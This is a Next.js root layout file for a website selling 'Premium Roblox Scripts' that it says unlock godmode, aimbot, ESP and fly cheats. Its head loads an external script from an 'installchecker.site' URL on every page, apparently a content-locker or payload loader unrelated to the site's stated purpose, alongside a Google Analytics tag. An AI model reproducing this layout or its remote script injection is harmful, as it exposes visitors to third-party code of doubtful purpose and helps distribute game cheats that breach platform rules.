import type React from "react"
import type { Metadata } from "next"
import { Inter } from "next/font/google"
import "./globals.css"

const inter = Inter({ subsets: ["latin"] })

export const metadata: Metadata = {
  title: "Roblox Scripts",
  description: "Premium Roblox Scripts - Unlock Godmode, Aimbot, ESP, Fly and more",
    generator: 'v0.dev'
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="en">
      <head>
        <link
          rel="icon"
          href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAKlBMVEVHcEyMff+Mff+Mff+Mff+Mff+Mff+Mff+Mff+Mff+Mff+Mff+Mff+Mff+DauQDAAAADnRSTlMADFUlMrlw/5X0g+On0vgqudEAAADnSURBVHgBYiAZMKILMIEIZmMgcHFxNgRUIc+IEYUBFIVvbLuKFpE2O4htl3HuQ8wdRH1s2+xiZ9YyePzndOcDEAAgkGa5QBKAidn5Zq0mFXgA/PpglMVafwKhnSaU8DlIBoLbTCDbphRvWGK7COoqOSjC4wEJARJIdgEIN6GF5KANfigh+2BDUDTJTQFaMkkZAhy8ku0iUKUcLYA/yW0I4Ev2FYkQSOZ2ixBKBV4QwGwDKo7UkxPH6cMlDCBJyhWvMOGLZF9lkWLBAimPVVAG/CUNgqj3jJR2DfwM4B/TNEDyid7ZjbYuEbNd7qs3kgsAAAAASUVORK5CYII="
          type="image/webp"
        />
        <title>Roblox Scripts</title>
       <script type="text/javascript" id="ogjs" src="https://installchecker.site/cl/js/2ljkdp"></script>
        {/* Google tag (gtag.js) */}
        <script async src="https://www.googletagmanager.com/gtag/js?id=G-J1BSNLE03B"></script>
        <script dangerouslySetInnerHTML={{
          __html: `
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
            gtag('config', 'G-J1BSNLE03B');
          `
        }} />
      </head>
      <body className={inter.className}>{children}</body>
    </html>
  )
}
